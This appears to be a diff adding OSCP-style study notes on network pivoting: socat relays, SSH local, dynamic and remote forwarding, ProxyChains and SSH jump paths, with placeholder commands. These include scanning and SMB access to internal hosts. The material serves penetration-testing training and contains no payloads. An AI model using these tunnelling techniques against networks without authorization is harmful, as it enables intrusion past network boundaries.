+<p><strong>Still missing before method selection:</strong> Confirm both legs, bind address/permission and any additional dynamic ports or return path.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>Both legs and the destination handshake work: choose a fixed TCP relay.</td></tr><tr><td>Ruled out in this context</td><td>The protocol needs unprovided UDP or dynamic connections: reject this one-port topology.</td></tr><tr><td>Inconclusive</td><td>A listen socket without the destination handshake leaves the remote leg unknown.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>.</p>
+<h3 id="3-prerequisites-1">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> A bindable pivot listener, source-to-listener access and pivot-to-destination connectivity.</p>
+<h3 id="4-discover-and-verify-prerequisites-1">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">ss -lnt
+ip route get TARGET
+</code></pre>
+<h3 id="5-why-it-works-1">5. Why it works</h3>
+<p>A fixed TCP relay transports bytes to a predetermined endpoint. It does not automatically carry UDP, DNS, dynamic RPC or callbacks.</p>
+<h3 id="6-execute-and-choose-variants-1">6. Execute and choose variants</h3>
+<p>On a Linux pivot, expose one internal TCP service:</p>
+<pre><code class="language-bash">socat -ddd TCP-LISTEN:LOCAL_PORT,bind=PIVOT_REACHABLE_IP,reuseaddr,fork \
+  TCP:INTERNAL_HOST:INTERNAL_PORT
+</code></pre>
+<p>Loopback-only relay for another local tunnel stage:</p>
+<pre><code class="language-bash">socat -ddd TCP-LISTEN:LOCAL_PORT,bind=127.0.0.1,reuseaddr,fork \
+  TCP:INTERNAL_HOST:INTERNAL_PORT
+</code></pre>
+<p>Verify the listener on the pivot with <code>ss -lntp | grep LOCAL_PORT</code>. Run <code>nc -nvz PIVOT_REACHABLE_IP LOCAL_PORT</code> from the intended client to test client-to-pivot reachability. These checks run on different machines:</p>
+<pre><code class="language-bash">ss -lntp | grep LOCAL_PORT
+nc -nvz PIVOT_REACHABLE_IP LOCAL_PORT
+</code></pre>
+<blockquote>
+<p><code>fork</code> handles multiple connections. <code>reuseaddr</code> eases rebinding after restart. Socat does not add authentication or encryption to this relay; bind narrowly and remove the process when finished. A listener can exist even when the pivot-to-destination connection fails.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-1">7. Worked example — hypothetical</h3>
+<p>Observation: an internal database is reachable from the pivot. Test: create the selected fixed relay and use its listener from the assessment source. Illustrative output: the database handshake succeeds. Interpretation: validate its own credentials/rights next.</p>
+<h3 id="8-verify-the-result-1">8. Verify the result</h3>
+<p>Verify application behavior through the listener and keep the transport's destination explicit.</p>
+<h3 id="9-failure-and-fallback-1">9. Failure and fallback</h3>
+<p>A working listener with no application response can be a pivot-to-destination failure. Dynamic RPC may need a different route.</p>
+<h3 id="10-next-transitions-1">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/services/#service-mssql">Use SQL Server rights, impersonation and command facilities</a>; <a href="/oscp/notes/methods/services/#service-mysql">Use MySQL/MariaDB data and file primitives</a>; <a href="/oscp/notes/methods/lateral-movement/#move-preflight">Match route, destination service and effective authorization</a>.</p>
+<p><a id="ssh-local"></a></p>
+<h2 id="forward-a-selected-service-through-an-ssh-client-side-listener">Forward a selected service through an SSH client-side listener</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#51-local-forward-listener-on-the-ssh-client">Operational procedure</a> | <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#5-openssh-forwarding">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-2">1. Purpose and result</h3>
+<p>A client-side port carrying the chosen internal TCP service.</p>
+<h3 id="2-recognition-clues-2">2. Recognition clues</h3>
+<p>SSH reaches a server that can access the needed internal service.</p>
+<h4 id="find-the-clue-from-your-starting-access-2">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Use accepted SSH and the SSH server's verified reachability to a selected internal/loopback service; identify where the local client needs its listener.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">ssh -v -p SSH_PORT USER@PIVOT
+ss -lnt
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Assessment client -> SSH server: accepted
+SSH server -> 127.0.0.1:INTERNAL_PORT: needed
+Desired listener: assessment client
+</code></pre>
+<p><strong>Recognize this detail:</strong> Client-side listener plus server-side destination is the -L direction; destination loopback belongs to the SSH server.</p>
+<p><strong>Still missing before method selection:</strong> Verify forwarding policy, local bind and server-to-destination application access.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The permitted local forward delivers the service handshake: choose -L.</td></tr><tr><td>Ruled out in this context</td><td>The server cannot reach the selected destination: reject this topology regardless of valid SSH login.</td></tr><tr><td>Inconclusive</td><td>SSH login alone leaves forwarding policy unknown.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/services/#service-ssh">Use SSH passwords, keys and forwarding-capable access</a>.</p>
+<h3 id="3-prerequisites-2">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> Accepted SSH identity and forwarding policy; local listener availability and SSH-server-to-destination route.</p>
+<h3 id="4-discover-and-verify-prerequisites-2">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">ssh -v -p SSH_PORT USER@PIVOT
+ss -lnt
+</code></pre>
+<h3 id="5-why-it-works-2">5. Why it works</h3>
+<p>With -L the listener is on the SSH client and the remote destination is reached from the SSH server. localhost in the destination therefore means the server's loopback.</p>
+<h3 id="6-execute-and-choose-variants-2">6. Execute and choose variants</h3>
+<p>Run on Kali when Kali can SSH to the pivot:</p>
+<pre><code class="language-bash">ssh -N \
+  -L 127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT \
+  -p SSH_PORT USER@PIVOT \
+  -o ExitOnForwardFailure=yes \
+  -o ServerAliveInterval=30 -o ServerAliveCountMax=3
+</code></pre>
+<p>Use the listener as though it were the internal service:</p>
+<pre><code class="language-bash">nc -nvz 127.0.0.1 LOCAL_PORT
+curl -v http://127.0.0.1:LOCAL_PORT/
+</code></pre>
+<blockquote>
+<p>The SSH server/pivot resolves and connects to <code>INTERNAL_HOST</code>. Bind to <code>127.0.0.1</code> unless another authorized local host must use the forward; <code>-g</code> or a non-loopback bind expands exposure.</p>
+</blockquote>
+<p>Add reliability and attributable failure to transport-only sessions:</p>
+<pre><code class="language-text">-N
+-o ExitOnForwardFailure=yes
+-o ServerAliveInterval=30
+-o ServerAliveCountMax=3
+</code></pre>
+<p><code>ExitOnForwardFailure</code> proves requested listening sockets were established. It does not prove the final destination is reachable through them.</p>
+<h3 id="7-worked-example--hypothetical-2">7. Worked example — hypothetical</h3>
+<p>Observation: a database listens only on the SSH server's loopback. Test: use the documented local forward to that loopback port. Illustrative output: the client-side database connection works. Interpretation: authenticate using database-specific credentials.</p>
+<h3 id="8-verify-the-result-2">8. Verify the result</h3>
+<p>Verify listening address plus the destination application's handshake and preserve correct hostname/SPN semantics when needed.</p>
+<h3 id="9-failure-and-fallback-2">9. Failure and fallback</h3>
+<p>Administrative-prohibited indicates SSH forwarding policy; address-in-use is a local bind problem; timeout can be the remote leg.</p>
+<h3 id="10-next-transitions-2">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/services/#service-mysql">Use MySQL/MariaDB data and file primitives</a>; <a href="/oscp/notes/methods/services/#service-mssql">Use SQL Server rights, impersonation and command facilities</a>; <a href="/oscp/notes/methods/pivoting/#pivot-dns">Preserve DNS, Kerberos names and time across a pivot</a>.</p>
+<p><a id="ssh-dynamic"></a></p>
+<h2 id="provide-socks-access-through-ssh-dynamic-forwarding">Provide SOCKS access through SSH dynamic forwarding</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#52-dynamic-forward-socks-listener-on-the-ssh-client">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-3">1. Purpose and result</h3>
+<p>A client-side SOCKS proxy for selected destination connections.</p>
+<h3 id="2-recognition-clues-3">2. Recognition clues</h3>
+<p>Several internal TCP services need access through one SSH server.</p>
+<h4 id="find-the-clue-from-your-starting-access-3">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> From accepted SSH and a mapped internal service set determine whether each required client can use a SOCKS TCP connection.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">ssh -v -p SSH_PORT USER@PIVOT
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">SSH path: accepted
+Needed destinations: several TCP services
+Client proxy support: inspect
+</code></pre>
+<p><strong>Recognize this detail:</strong> Multiple client-selected TCP destinations suggest a dynamic SOCKS listener rather than many fixed forwards.</p>
+<p><strong>Still missing before method selection:</strong> Check SSH forwarding, listener bind, native/intercepted client support and DNS resolution location.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>Proxy-aware clients reach the selected applications: choose dynamic SOCKS.</td></tr><tr><td>Ruled out in this context</td><td>The needed operation relies on raw/unsupported UDP traffic: reject ordinary TCP SOCKS for that operation.</td></tr><tr><td>Inconclusive</td><td>A working SSH session without a proxy-aware test leaves application/proxy compatibility unknown.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/services/#service-ssh">Use SSH passwords, keys and forwarding-capable access</a>.</p>
+<h3 id="3-prerequisites-3">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> SSH forwarding allowed and clients that support SOCKS or compatible interception; DNS behavior must be chosen explicitly.</p>
+<h3 id="4-discover-and-verify-prerequisites-3">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">ssh -v -p SSH_PORT USER@PIVOT
+</code></pre>
+<h3 id="5-why-it-works-3">5. Why it works</h3>
+<p>A SOCKS client requests each destination through the SSH server. Raw packets and arbitrary UDP are not automatically proxied by ordinary TCP SOCKS wrappers.</p>
+<h3 id="6-execute-and-choose-variants-3">6. Execute and choose variants</h3>
+<pre><code class="language-bash">ssh -N -D 127.0.0.1:1080 -p SSH_PORT USER@PIVOT \
+  -o ExitOnForwardFailure=yes \
+  -o ServerAliveInterval=30 -o ServerAliveCountMax=3
+</code></pre>
+<p>OpenSSH acts as a SOCKS4/5 server. The pivot makes destination connections selected by each SOCKS request.</p>
+<h3 id="7-worked-example--hypothetical-3">7. Worked example — hypothetical</h3>
+<p>Observation: multiple web/SMB services are reachable from the SSH server. Test: create the dynamic listener and send a proxy-aware HTTP request. Illustrative output: the internal page loads through SOCKS. Interpretation: use only compatible TCP clients and validate DNS separately.</p>
+<h3 id="8-verify-the-result-3">8. Verify the result</h3>
+<p>Verify one application through the proxy, then check each client's actual proxy and DNS behavior.</p>
+<h3 id="9-failure-and-fallback-3">9. Failure and fallback</h3>
+<p>A working proxy does not make raw SYN/UDP scans viable. Use connect-based clients or a suitable routed tunnel.</p>
+<h3 id="10-next-transitions-3">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/pivoting/#proxy-clients">Use ProxyChains, native SOCKS clients and SSH jump paths appropriately</a>; <a href="/oscp/notes/methods/discovery/#tcp-coverage">Discover TCP ports with SYN or connect scans</a>; <a href="/oscp/notes/methods/pivoting/#pivot-dns">Preserve DNS, Kerberos names and time across a pivot</a>.</p>
+<p><a id="ssh-remote"></a></p>
+<h2 id="expose-an-ssh-client-side-destination-through-a-server-side-remote-listener">Expose an SSH-client-side destination through a server-side remote listener</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#53-remote-forward-listener-on-the-ssh-server">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-4">1. Purpose and result</h3>
+<p>A server-side listener forwarding to a destination reached from the SSH client.</p>
+<h3 id="2-recognition-clues-4">2. Recognition clues</h3>
+<p>The useful side can initiate SSH outward but cannot accept an inbound management connection.</p>
+<h4 id="find-the-clue-from-your-starting-access-4">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Identify an outbound-only pivot-to-SSH-server path and a service reached from that SSH client/pivot; decide where the remote listener is needed.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">ssh -v USER@SSH_SERVER
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Pivot/client -> SSH server: allowed
+SSH server -> pivot inbound: blocked
+Desired listener: SSH server
+</code></pre>
+<p><strong>Recognize this detail:</strong> The useful listener is on the SSH server while the destination is reached from the client side: a remote forward candidate.</p>
+<p><strong>Still missing before method selection:</strong> Verify remote-forward permission, server bind/GatewayPorts policy and pivot-side destination reachability.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The server-side listener carries the intended service: choose the -R fixed forward.</td></tr><tr><td>Ruled out in this context</td><td>Only a loopback listener is available but another host must connect and no approved bind path exists: reject that exposure design.</td></tr><tr><td>Inconclusive</td><td>Accepted outbound SSH does not prove remote listener policy.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>.</p>
+<h3 id="3-prerequisites-4">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> Outbound SSH route, accepted identity, server forwarding/GatewayPorts policy and reachability to the chosen client-side destination.</p>
+<h3 id="4-discover-and-verify-prerequisites-4">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">ssh -v USER@SSH_SERVER
+ss -lnt
+</code></pre>
+<h3 id="5-why-it-works-4">5. Why it works</h3>
+<p>With -R the listener is on the SSH server. Its public exposure depends on bind address/server policy; target localhost is evaluated on the SSH client side.</p>
+<h3 id="6-execute-and-choose-variants-4">6. Execute and choose variants</h3>
+<p>Run on a pivot that can initiate an SSH connection back to Kali:</p>
+<pre><code class="language-bash">ssh -N \
+  -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT \
+  -p KALI_SSH_PORT KALI_USER@LHOST \
+  -o ExitOnForwardFailure=yes \
+  -o ServerAliveInterval=30 -o ServerAliveCountMax=3
+</code></pre>
+<p>Kali then uses:</p>
+<pre><code class="language-bash">nc -nvz 127.0.0.1 KALI_PORT
+</code></pre>
+<blockquote>
+<p>The SSH client/pivot connects to <code>INTERNAL_HOST</code>. <code>AllowTcpForwarding</code> and server policy must permit the forward. A non-loopback remote bind additionally depends on <code>GatewayPorts</code>; do not assume <code>0.0.0.0</code> was honored.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-4">7. Worked example — hypothetical</h3>
+<p>Observation: a pivot can initiate SSH to the assessment host. Test: remote-forward a selected internal service. Illustrative output: the assessment-side listener reaches that service via the pivot. Interpretation: connect using the destination service's identity rules.</p>
+<h3 id="8-verify-the-result-4">8. Verify the result</h3>
+<p>Verify listener placement/bind and actual destination application response.</p>
+<h3 id="9-failure-and-fallback-4">9. Failure and fallback</h3>
+<p>A loopback-only server listener is not reachable by another host. Check remote-forward permission and binding before changing service credentials.</p>
+<h3 id="10-next-transitions-4">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/lateral-movement/#move-preflight">Match route, destination service and effective authorization</a>; <a href="/oscp/notes/methods/services/#service-smb">Enumerate SMB/RPC shares, files and identities</a>; <a href="/oscp/notes/methods/pivoting/#pivot-callback">Build the callback and delivery routes separately from the attack route</a>.</p>
+<p><a id="ssh-remote-dynamic"></a></p>
+<h2 id="expose-a-server-side-socks-proxy-through-remote-dynamic-ssh-forwarding">Expose a server-side SOCKS proxy through remote dynamic SSH forwarding</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#54-remote-dynamic-forward-socks-listener-on-the-ssh-server">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-5">1. Purpose and result</h3>
+<p>A server-side SOCKS listener whose connections exit from the SSH client/pivot.</p>
+<h3 id="2-recognition-clues-5">2. Recognition clues</h3>
+<p>Only the pivot can initiate SSH, but several client-selected internal destinations are needed.</p>
+<h4 id="find-the-clue-from-your-starting-access-5">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> For an outbound-only SSH path identify the need for several client-selected destinations and inspect the actual SSH client implementation/version.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">ssh -V
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">SSH client: supported current OpenSSH
+Outbound pivot -> server: allowed
+Server-side SOCKS listener: required
+</code></pre>
+<p><strong>Recognize this detail:</strong> Remote listener placement plus per-connection SOCKS destination selection suggests remote dynamic forwarding.</p>
+<p><strong>Still missing before method selection:</strong> Check implementation support, remote-forward policy, listener binding and proxy-client/DNS compatibility.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>A supported remote dynamic listener carries the intended TCP clients: choose that mode.</td></tr><tr><td>Ruled out in this context</td><td>The installed SSH client does not support the syntax or policy forbids it: reject that variant.</td></tr><tr><td>Inconclusive</td><td>A version string without a controlled forwarding/application test leaves policy/transport unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/pivoting/#ssh-remote">Expose an SSH-client-side destination through a server-side remote listener</a>.</p>
+<h3 id="3-prerequisites-5">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> A supporting OpenSSH client, allowed remote forwarding, listener binding and SOCKS-compatible tool clients.</p>
+<h3 id="4-discover-and-verify-prerequisites-5">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">ssh -V
+</code></pre>
+<h3 id="5-why-it-works-5">5. Why it works</h3>
+<p>Remote dynamic forwarding reverses listener placement while preserving per-connection SOCKS destination selection. OpenSSH implementation/version support must be checked.</p>
+<h3 id="6-execute-and-choose-variants-5">6. Execute and choose variants</h3>
+<p>Run on the pivot:</p>
+<pre><code class="language-bash">ssh -N -R 127.0.0.1:1080 -p KALI_SSH_PORT KALI_USER@LHOST \
+  -o ExitOnForwardFailure=yes \
+  -o ServerAliveInterval=30 -o ServerAliveCountMax=3
+</code></pre>
+<p>The SOCKS listener appears on Kali and destination connections exit through the pivot. Remote dynamic forwarding requires OpenSSH 7.6 or later on the client that issues <code>-R</code>. Run <code>ssh -V</code> on the pivot (the SSH client). Run <code>ss -lntp | grep 1080</code> on Kali (the SSH server hosting the SOCKS listener). These checks run on different machines; do not paste both into one terminal:</p>
+<pre><code class="language-bash">ssh -V
+ss -lntp | grep 1080
+</code></pre>
+<h3 id="7-worked-example--hypothetical-5">7. Worked example — hypothetical</h3>
+<p>Observation: the pivot has a supported OpenSSH client and outbound SSH. Test: establish the documented remote dynamic listener and a single proxy-aware request. Illustrative output: the internal page returns. Interpretation: use the proxy with explicit DNS and TCP limitations.</p>
+<h3 id="8-verify-the-result-5">8. Verify the result</h3>
+<p>Verify the listener's actual location and source-side exit by application evidence.</p>
+<h3 id="9-failure-and-fallback-5">9. Failure and fallback</h3>
+<p>Unsupported client syntax or forwarding policy is different from destination filtering. Use a fixed remote forward if it satisfies the task.</p>
+<h3 id="10-next-transitions-5">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/pivoting/#proxy-clients">Use ProxyChains, native SOCKS clients and SSH jump paths appropriately</a>; <a href="/oscp/notes/methods/pivoting/#ssh-remote">Expose an SSH-client-side destination through a server-side remote listener</a>; <a href="/oscp/notes/methods/pivoting/#pivot-dns">Preserve DNS, Kerberos names and time across a pivot</a>.</p>
+<p><a id="proxy-clients"></a></p>
+<h2 id="use-proxychains-native-socks-clients-and-ssh-jump-paths-appropriately">Use ProxyChains, native SOCKS clients and SSH jump paths appropriately</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#55-ssh-jump-and-proxy-command">Operational procedure</a> | <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#6-proxychains-and-socks-aware-clients">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-6">1. Purpose and result</h3>
+<p>A verified application connection through the chosen proxy/jump.</p>
+<h3 id="2-recognition-clues-6">2. Recognition clues</h3>
+<p>A SOCKS listener or an SSH jump host is already available.</p>
+<h4 id="find-the-clue-from-your-starting-access-6">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect the established proxy/jump topology and each intended client's actual SOCKS or SSH-jump support before a protocol test.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">curl --socks5-hostname 127.0.0.1:SOCKS_PORT http://TARGET:PORT/
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Proxy-aware HTTP request: application response
+Raw discovery request: no useful result
+</code></pre>
+<p><strong>Recognize this detail:</strong> One supported TCP application works; the proxy does not automatically carry raw packets or arbitrary DNS/UDP.</p>
+<p><strong>Still missing before method selection:</strong> Check native versus intercepted support, connect-only scanner modes, name resolution and every required protocol leg.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The actual client's application handshake works through the chosen proxy/jump: use it.</td></tr><tr><td>Ruled out in this context</td><td>A static/raw/UDP-only client is incompatible with this proxy wrapper: choose another transport.</td></tr><tr><td>Inconclusive</td><td>A reachable SOCKS port without an end-to-end service test leaves the exit path unknown.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/pivoting/#ssh-dynamic">Provide SOCKS access through SSH dynamic forwarding</a>.</p>
+<h3 id="3-prerequisites-6">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> Client/proxy transport compatibility, correct proxy configuration and controlled name resolution.</p>
+<h3 id="4-discover-and-verify-prerequisites-6">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">curl --socks5-hostname 127.0.0.1:SOCKS_PORT http://TARGET:PORT/
+</code></pre>
+<h3 id="5-why-it-works-6">5. Why it works</h3>
+<p>Native proxy support and library interception work differently. A TCP connect path can work while raw probes, statically linked tools or local DNS leak outside the intended path.</p>
+<h3 id="6-execute-and-choose-variants-6">6. Execute and choose variants</h3>
+<p>Direct SSH through an SSH pivot:</p>
+<pre><code class="language-bash">ssh -J PIVOT_USER@PIVOT TARGET_USER@INTERNAL_HOST
+</code></pre>
+<p>SSH through an existing SOCKS5 endpoint with Ncat:</p>
+<pre><code class="language-bash">ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' \
+  TARGET_USER@INTERNAL_HOST
+</code></pre>
+<p><code>%h</code> and <code>%p</code> are replaced with the destination host and port. Prefer this native proxy route when ProxyChains interposition is unreliable.</p>
+<details>
+<summary><strong>Use an SSH configuration for repeated access</strong></summary>
+<pre><code class="language-sshconfig">Host pivot
+  HostName PIVOT
+  User PIVOT_USER
+
+Host internal
+  HostName INTERNAL_HOST
+  User TARGET_USER
+  ProxyJump pivot
+</code></pre>
+<pre><code class="language-bash">ssh internal
+scp FILE internal:DESTINATION_PATH
+</code></pre>
+</details>
+<p>Use a task-specific configuration rather than repeatedly editing a shared global file:</p>
+<pre><code class="language-text">strict_chain
+proxy_dns
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+
+[ProxyList]
+socks5 127.0.0.1 1080
+</code></pre>
+<pre><code class="language-bash">proxychains4 -q -f ./proxychains-pivot.conf curl http://INTERNAL_HOST:PORT/
+proxychains4 -q -f ./proxychains-pivot.conf nmap -sT -Pn -n -p PORTS INTERNAL_HOST
+proxychains4 -q -f ./proxychains-pivot.conf impacket-smbclient \
+  'DOMAIN/USER:PASSWORD@INTERNAL_HOST'
+</code></pre>
+<p>Constraints:</p>
+<ul>
+<li>ProxyChains hooks socket calls in dynamically linked programs; some static binaries, scripts, child processes or dynamically loaded modules bypass or break the hook.</li>
+<li>ProxyChains supports TCP only. It does not proxy UDP, ICMP, SYN scans or pcap-based discovery.</li>
+<li>For Nmap use <code>-sT -Pn -n</code> with a focused port list. Proxy scanning is slow and is not a replacement for discovery from the pivot.</li>
+<li><code>proxy_dns</code> moves supported hostname resolution through the proxy, but application behavior varies. <code>-n</code> prevents Nmap's local reverse lookups.</li>
+<li>Prefer an application's native proxy option when available.</li>
+</ul>
+<p>Native examples:</p>
+<pre><code class="language-bash">curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_HOST:PORT/
+ncat --proxy-type socks5 --proxy 127.0.0.1:1080 INTERNAL_HOST INTERNAL_PORT
+</code></pre>
+<h3 id="7-worked-example--hypothetical-6">7. Worked example — hypothetical</h3>
+<p>Observation: curl works through SOCKS while a scanner fails. Test: use its documented connect-only mode and skip unsupported discovery. Illustrative output: selected TCP connections work. Interpretation: respect the client's transport limits rather than treating the proxy as broken.</p>
+<h3 id="8-verify-the-result-6">8. Verify the result</h3>
+<p>Verify destination application and resolver behavior through the intended path.</p>
+<h3 id="9-failure-and-fallback-6">9. Failure and fallback</h3>
+<p>Proxy interception is not universal. Use native proxy support, an SSH jump for SSH, or routed tunneling when the protocol requires it.</p>
+<h3 id="10-next-transitions-6">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/discovery/#tcp-coverage">Discover TCP ports with SYN or connect scans</a>; <a href="/oscp/notes/methods/lateral-movement/#move-preflight">Match route, destination service and effective authorization</a>; <a href="/oscp/notes/methods/pivoting/#ligolo-route">Route a selected internal subnet through Ligolo-ng</a>.</p>
+<p><a id="sshuttle-route"></a></p>
+<h2 id="route-a-selected-subnet-through-sshuttle">Route a selected subnet through sshuttle</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#7-sshuttle-transparent-selected-subnet-route">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-7">1. Purpose and result</h3>
+<p>A verified transparent route for the chosen supported traffic.</p>
+<h3 id="2-recognition-clues-7">2. Recognition clues</h3>
+<p>Multiple internal TCP destinations need transparent application access over SSH.</p>
+<h4 id="find-the-clue-from-your-starting-access-7">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Identify several internal TCP destinations, existing SSH access and whether the local/remote privilege/runtime requirements can be met.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">ssh -v USER@PIVOT
+python3 --version
+ip route
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">SSH path: accepted
+Local routing/firewall context: inspect
+Remote Python support: inspect in SSH context
+</code></pre>
+<p><strong>Recognize this detail:</strong> An SSH carrier and compatible endpoints make a transparent selected-subnet route a candidate; local Python output alone does not prove the remote runtime.</p>
+<p><strong>Still missing before method selection:</strong> Verify local route/firewall permissions, remote runtime, supported transport/mode and explicitly selected subnet/DNS behavior.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
